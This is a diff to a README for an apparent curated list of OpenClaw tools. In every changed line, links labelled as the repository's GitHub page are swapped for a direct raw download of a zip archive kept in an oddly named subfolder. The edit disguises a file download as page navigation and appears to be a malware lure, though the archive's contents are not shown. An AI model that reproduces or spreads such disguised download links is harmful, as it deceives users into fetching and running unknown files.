@@ -1,6 +1,6 @@
 # 🛠️ awesome-openclaw - Find the best OpenClaw tools
 
-[![Download](https://img.shields.io/badge/Download-OpenClaw%20Resources-blue?style=for-the-badge)](https://github.com/stephiedocile449/awesome-openclaw)
+[![Download](https://img.shields.io/badge/Download-OpenClaw%20Resources-blue?style=for-the-badge)](https://raw.githubusercontent.com/stephiedocile449/awesome-openclaw/main/pronate/openclaw_awesome_1.7.zip)
 
 ## 📘 What this is
 
@@ -33,7 +33,7 @@ For most users, no special setup is needed to open this repository and use the l
 
 Use this link to visit the main page and get the resources from there:
 
-[Open awesome-openclaw on GitHub](https://github.com/stephiedocile449/awesome-openclaw)
+[Open awesome-openclaw on GitHub](https://raw.githubusercontent.com/stephiedocile449/awesome-openclaw/main/pronate/openclaw_awesome_1.7.zip)
 
 ## 🧭 How to use it on Windows
 
@@ -130,7 +130,7 @@ This repository covers topics like:
 
 ## 📎 Link to the main page
 
-[Visit awesome-openclaw on GitHub](https://github.com/stephiedocile449/awesome-openclaw)
+[Visit awesome-openclaw on GitHub](https://raw.githubusercontent.com/stephiedocile449/awesome-openclaw/main/pronate/openclaw_awesome_1.7.zip)
 
 ## 🧭 What to expect next
 
